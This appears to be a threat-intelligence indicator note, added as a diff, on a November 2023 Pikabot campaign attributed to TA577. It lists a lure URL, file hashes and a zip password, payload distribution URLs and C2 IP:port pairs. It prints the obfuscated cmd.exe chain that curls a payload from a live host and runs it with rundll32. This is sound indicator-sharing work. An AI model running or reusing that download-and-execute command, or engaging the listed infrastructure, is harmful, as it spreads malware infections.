@@ -1,0 +1,62 @@
+03.11.2023 | Pikabot | TA577 | 1.1.15-ghost
+
+*************************************************
+
+.url https://ximenacastillo.com/as/
+.zip 802030a2333b91485bb2d1d78b2f9d8347c5dee8db669ff27c4be6782c88f0a0 pw = P189
+.dll a352b9eb373fe914888128f3e6e72cab5a5193cbe491af45304ed7985c9dff8f
+
+*************************************************
+
+rar > cmd > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Cycqklny.js
+
+cmd.exe /c jrtWgN8 || eCHO lIjJ74wQX & PInG UX1 || Curl http://104.238.156.73/vXS/Macro -o %TMP%\F26O.cpl & PInG -n 2 UX1 || rUNdlL32 %tMP%\F26O.cpl, Crash & eXiT d7AISzopxFjdzu
+
+PInG  UX1 
+
+Curl http://104.238.156.73/vXS/Macro -o C:\Users\Admin\AppData\Local\Temp\F26O.cpl 
+
+PInG -n 2 UX1 
+
+rUNdlL32 C:\Users\Admin\AppData\Local\Temp\F26O.cpl, Crash 
+
+
+*************************************************
+
+.url
+
+https://ximenacastillo.com/as/
+
+*************************************************
+
+.dll distro
+
+http://104.238.156.73/vXS/Macro
+http://149.28.15.251/XXdU/Cageo
+http://216.128.180.51/tk3rDS3/hydra
+
+*************************************************
+
+c2'
+
+65.20.84.254:1378
+104.238.144.171:2221
+154.61.75.156:2078
+158.247.197.73:23399
+198.13.58.126:2223
+51.195.232.97:13782
+158.247.202.180:13783
+154.61.75.156:2078
+210.243.8.247:23399
+198.13.58.126:2223
+154.221.30.136:13724
+45.32.140.39:2078
+158.247.197.73:23399
+65.20.84.3:2221
+154.92.19.139:2222
+65.20.84.254:13783
+167.179.103.206:2083
+95.179.141.41:1194
+104.238.144.171:2221
